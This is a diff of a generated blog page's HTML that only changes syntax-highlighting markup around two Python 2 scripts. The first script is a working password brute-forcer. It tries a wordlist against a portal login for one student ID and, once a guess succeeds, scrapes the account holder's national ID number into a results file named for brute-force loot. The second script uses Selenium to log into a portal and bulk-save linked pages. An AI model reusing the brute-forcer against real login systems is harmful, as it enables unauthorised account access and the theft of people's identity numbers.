@@ -307,62 +307,62 @@
 <a class="anchor" href="#1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>1</h2>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding: utf-8 -*-
-</span><span class="kn">import</span> <span class="nn">httplib</span><span class="p">,</span> <span class="n">urllib</span> <span class="p">,</span> <span class="n">cookielib</span><span class="p">,</span> <span class="n">urllib2</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">time</span>  <span class="c1">#, threading
-</span><span class="n">path</span> <span class="o">=</span> <span class="s">'http://xxxx/dologin.php'</span>
-<span class="n">path2</span> <span class="o">=</span> <span class="s">'http://xxxx/selfinfor.php'</span>
-<span class="n">stuid</span> <span class="o">=</span> <span class="s">'20xxxxxxxx'</span>
-<span class="n">pwdtext</span> <span class="o">=</span> <span class="s">'xxxx.txt'</span>
+</span><span class="kn">import</span> <span class="n">httplib</span><span class="p">,</span> <span class="n">urllib</span> <span class="p">,</span> <span class="n">cookielib</span><span class="p">,</span> <span class="n">urllib2</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">time</span>  <span class="c1">#, threading
+</span><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://xxxx/dologin.php</span><span class="sh">'</span>
+<span class="n">path2</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://xxxx/selfinfor.php</span><span class="sh">'</span>
+<span class="n">stuid</span> <span class="o">=</span> <span class="sh">'</span><span class="s">20xxxxxxxx</span><span class="sh">'</span>
+<span class="n">pwdtext</span> <span class="o">=</span> <span class="sh">'</span><span class="s">xxxx.txt</span><span class="sh">'</span>
 
 
 <span class="k">def</span> <span class="nf">Check</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
     <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s">'ID'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
-        <span class="s">'Password'</span><span class="p">:</span> <span class="n">password</span>
+        <span class="sh">'</span><span class="s">ID</span><span class="sh">'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+        <span class="sh">'</span><span class="s">Password</span><span class="sh">'</span><span class="p">:</span> <span class="n">password</span>
         <span class="p">}</span>
-    <span class="n">cj</span> <span class="o">=</span> <span class="n">cookielib</span><span class="p">.</span><span class="n">CookieJar</span><span class="p">()</span>  
-    <span class="n">post_data</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
-    <span class="n">UserAgent</span> <span class="o">=</span> <span class="s">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'</span>
-    <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">cj</span> <span class="o">=</span> <span class="n">cookielib</span><span class="p">.</span><span class="nc">CookieJar</span><span class="p">()</span>  
+    <span class="n">post_data</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="nf">urlencode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
+    <span class="n">UserAgent</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36</span><span class="sh">'</span>
+    <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
         <span class="k">try</span><span class="p">:</span>
-            <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="p">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cj</span><span class="p">))</span>  
-            <span class="n">opener</span><span class="p">.</span><span class="n">addheaders</span> <span class="o">=</span> <span class="p">[(</span><span class="s">'User-Agent'</span><span class="p">,</span> <span class="n">UserAgent</span><span class="p">)]</span>
-            <span class="n">urllib2</span><span class="p">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>  
-            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">post_data</span><span class="p">)</span>  
-            <span class="n">conn</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span>
-            <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="p">.</span><span class="nc">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cj</span><span class="p">))</span>  
+            <span class="n">opener</span><span class="p">.</span><span class="n">addheaders</span> <span class="o">=</span> <span class="p">[(</span><span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">,</span> <span class="n">UserAgent</span><span class="p">)]</span>
+            <span class="n">urllib2</span><span class="p">.</span><span class="nf">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>  
+            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">post_data</span><span class="p">)</span>  
+            <span class="n">conn</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">6</span><span class="p">)</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
             <span class="c1"># print res
-</span>            <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-            <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"用户名或密码错误"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>        
-                <span class="k">print</span> <span class="s">'now: '</span> <span class="o">+</span> <span class="n">password</span>
+</span>            <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">用户名或密码错误</span><span class="sh">"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>        
+                <span class="k">print</span> <span class="sh">'</span><span class="s">now: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">password</span>
                 <span class="k">return</span> <span class="bp">False</span>
             <span class="k">else</span><span class="p">:</span>
-                <span class="n">conn2</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
-                <span class="n">res2</span> <span class="o">=</span> <span class="n">conn2</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
-                <span class="n">conn2</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-                <span class="n">regx</span>  <span class="o">=</span> <span class="s">r'&lt;tr&gt;&lt;th&gt;身份证号:&lt;/th&gt;&lt;td&gt;(.*)&lt;/td&gt;&lt;/tr&gt;'</span>
+                <span class="n">conn2</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
+                <span class="n">res2</span> <span class="o">=</span> <span class="n">conn2</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+                <span class="n">conn2</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+                <span class="n">regx</span>  <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">&lt;tr&gt;&lt;th&gt;身份证号:&lt;/th&gt;&lt;td&gt;(.*)&lt;/td&gt;&lt;/tr&gt;</span><span class="sh">'</span>
                 <span class="c1"># idnumre = '^\d{15}(\d{2}[0-9xX])?$'
 </span>                <span class="c1">#for line in res2:
 </span>                  <span class="c1">#  if re.search(idnumre , line):
-</span>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regx</span><span class="p">,</span> <span class="n">res2</span><span class="p">)</span>
-                <span class="k">print</span> <span class="s">'pwd: '</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">' usr: '</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span>  <span class="s">' ID number '</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-                <span class="n">outFile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'result '</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s">'.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
-                <span class="n">outFile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'pwd: '</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">' usr: '</span> <span class="o">+</span> <span class="n">stuid</span> <span class="o">+</span>  <span class="s">' ID number '</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-                <span class="n">outFile</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</span>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="n">regx</span><span class="p">,</span> <span class="n">res2</span><span class="p">)</span>
+                <span class="k">print</span> <span class="sh">'</span><span class="s">pwd: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> usr: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span>  <span class="sh">'</span><span class="s"> ID number </span><span class="sh">'</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">outFile</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">result </span><span class="sh">'</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="sh">'</span><span class="s">.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span>
+                <span class="n">outFile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="s">pwd: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">()</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> usr: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">stuid</span> <span class="o">+</span>  <span class="sh">'</span><span class="s"> ID number </span><span class="sh">'</span> <span class="o">+</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                <span class="n">outFile</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
                     <span class="c1">#else:
 </span>                      <span class="c1">#  continue
 </span>                <span class="k">return</span> <span class="bp">True</span>
         <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span> 
-            <span class="k">print</span> <span class="nb">Exception</span><span class="p">,</span><span class="s">":"</span><span class="p">,</span><span class="n">e</span>
+            <span class="k">print</span> <span class="nb">Exception</span><span class="p">,</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">,</span><span class="n">e</span>
             
             <span class="k">if</span> <span class="n">tries</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">2</span><span class="p">):</span>
                 <span class="k">continue</span>
             <span class="k">else</span><span class="p">:</span>
-                <span class="k">print</span> <span class="s">'Has tried 3 times to access and failed!'</span>
-                <span class="k">print</span> <span class="s">'sth wrong, retry manually pwd: '</span> <span class="o">+</span> <span class="n">password</span>
+                <span class="k">print</span> <span class="sh">'</span><span class="s">Has tried 3 times to access and failed!</span><span class="sh">'</span>
+                <span class="k">print</span> <span class="sh">'</span><span class="s">sth wrong, retry manually pwd: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">password</span>
                 <span class="k">break</span>
 
-<span class="s">'''
-if __name__ == '__main__':
+<span class="sh">'''</span><span class="s">
+if __name__ == </span><span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="s">:
     tsk = []
     with open(pwdtext) as pwdfile:
         for i in pwdfile.readlines():
@@ -373,16 +373,16 @@ if __name__ == '__main__':
     for t in tsk:
         t.start()
         t.join(5) 
-    print "All thread OK,maybe not "
-    outFile = open('爆破成果.txt', 'w')
-    outFile.write('pwd: ' + password + ' usr: ' + username +  ' ID number ' + tmp[0])
+    print </span><span class="sh">"</span><span class="s">All thread OK,maybe not </span><span class="sh">"</span><span class="s">
+    outFile = open(</span><span class="sh">'</span><span class="s">爆破成果.txt</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="s">)
+    outFile.write(</span><span class="sh">'</span><span class="s">pwd: </span><span class="sh">'</span><span class="s"> + password + </span><span class="sh">'</span><span class="s"> usr: </span><span class="sh">'</span><span class="s"> + username +  </span><span class="sh">'</span><span class="s"> ID number </span><span class="sh">'</span><span class="s"> + tmp[0])
     outFile.close()
-'''</span>
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
+</span><span class="sh">'''</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
          <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="p">:</span>
-            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">Check</span><span class="p">(</span><span class="n">stuid</span><span class="p">,</span><span class="n">i</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()):</span>
+            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nc">Check</span><span class="p">(</span><span class="n">stuid</span><span class="p">,</span><span class="n">i</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">()):</span>
                 <span class="k">break</span>
 
 </code></pre></div></div>
@@ -392,54 +392,54 @@ if __name__ == '__main__':
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="c1"># -*- coding: utf-8 -*-
-</span><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
-<span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">TimeoutException</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">win32api</span>
-<span class="kn">import</span> <span class="nn">win32con</span>
+</span><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="n">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">TimeoutException</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">win32api</span>
+<span class="kn">import</span> <span class="n">win32con</span>
 
-<span class="n">site</span> <span class="o">=</span> <span class="s">'http://xxxx/index.portal'</span>
-<span class="n">stuid</span> <span class="o">=</span> <span class="s">'xxxxxx'</span>
-<span class="n">pwdtext</span> <span class="o">=</span> <span class="s">'123456'</span>
-<span class="n">link</span> <span class="o">=</span> <span class="s">'list2.txt'</span>
+<span class="n">site</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://xxxx/index.portal</span><span class="sh">'</span>
+<span class="n">stuid</span> <span class="o">=</span> <span class="sh">'</span><span class="s">xxxxxx</span><span class="sh">'</span>
+<span class="n">pwdtext</span> <span class="o">=</span> <span class="sh">'</span><span class="s">123456</span><span class="sh">'</span>
+<span class="n">link</span> <span class="o">=</span> <span class="sh">'</span><span class="s">list2.txt</span><span class="sh">'</span>
 
-<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="n">Chrome</span><span class="p">()</span>
-<span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>
-<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"userName"</span><span class="p">).</span><span class="n">send_keys</span><span class="p">(</span><span class="n">stuid</span><span class="p">)</span>
-<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"password"</span><span class="p">).</span><span class="n">send_keys</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span>
-<span class="n">driver</span><span class="p">.</span><span class="n">find_element_by_name</span><span class="p">(</span><span class="s">"btn"</span><span class="p">).</span><span class="n">click</span><span class="p">()</span>
-<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Chrome</span><span class="p">()</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">find_element_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">userName</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">stuid</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">find_element_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">pwdtext</span><span class="p">)</span>
+<span class="n">driver</span><span class="p">.</span><span class="nf">find_element_by_name</span><span class="p">(</span><span class="sh">"</span><span class="s">btn</span><span class="sh">"</span><span class="p">).</span><span class="nf">click</span><span class="p">()</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">link</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
-        <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">link</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwdfile</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pwdfile</span><span class="p">.</span><span class="nf">readlines</span><span class="p">():</span>
+        <span class="k">for</span> <span class="n">tries</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
             <span class="k">try</span><span class="p">:</span>
-                <span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                 <span class="c1">#driver.save_screenshot(i[-14:])
-</span>                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#ctrl键位码是17
-</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#s键位码是83
-</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#s释放按键
-</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span>                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">win32api</span><span class="p">.</span><span class="nf">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#ctrl键位码是17
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="nf">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#s键位码是83
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="nf">keybd_event</span><span class="p">(</span><span class="mi">83</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#s释放按键
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="nf">keybd_event</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">win32con</span><span class="p">.</span><span class="n">KEYEVENTF_KEYUP</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+                <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                 <span class="c1">#win32api.keybd_event(16,0,0,0)
 </span>                <span class="c1">#win32api.keybd_event(16,0,win32con.KEYEVENTF_KEYUP,0)
-</span>                <span class="n">win32api</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'open'</span><span class="p">,</span> <span class="s">'saveas.exe'</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span><span class="s">''</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#autoit
-</span>                <span class="k">print</span> <span class="s">'success'</span>
+</span>                <span class="n">win32api</span><span class="p">.</span><span class="nc">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">saveas.exe</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">,</span><span class="sh">''</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#autoit
+</span>                <span class="k">print</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span>
                 <span class="k">break</span>
-                <span class="s">'''
-                with open(i[-14:],'wb') as code:
+                <span class="sh">'''</span><span class="s">
+                with open(i[-14:],</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="s">) as code:
                     code.write(content)
                     break
-                '''</span>
+                </span><span class="sh">'''</span>
             <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span> 
-                <span class="k">print</span> <span class="nb">Exception</span><span class="p">,</span><span class="s">":"</span><span class="p">,</span><span class="n">e</span>
+                <span class="k">print</span> <span class="nb">Exception</span><span class="p">,</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">,</span><span class="n">e</span>
                 <span class="k">if</span> <span class="n">tries</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">3</span><span class="p">):</span>
                     <span class="k">continue</span>
                 <span class="k">else</span><span class="p">:</span>
-                    <span class="k">print</span> <span class="s">'Has tried 3 times to access '</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">' and failed!'</span>
+                    <span class="k">print</span> <span class="sh">'</span><span class="s">Has tried 3 times to access </span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> and failed!</span><span class="sh">'</span>
 
 </code></pre></div></div>
 
@@ -680,7 +680,7 @@ Send("{ENTER}")
                 <span>Table of Contents <!-- sup class="scroll-top" style="text-transform:none">back to top</sup --></span>
             </h6>
             <div id="navbar">
-                <ul class="section-nav">
+                <ul id="toc" class="section-nav">
 <li class="toc-entry toc-h1"><a href="#0">0</a>
 <ul>
 <li class="toc-entry toc-h2"><a href="#ab">AB</a></li>
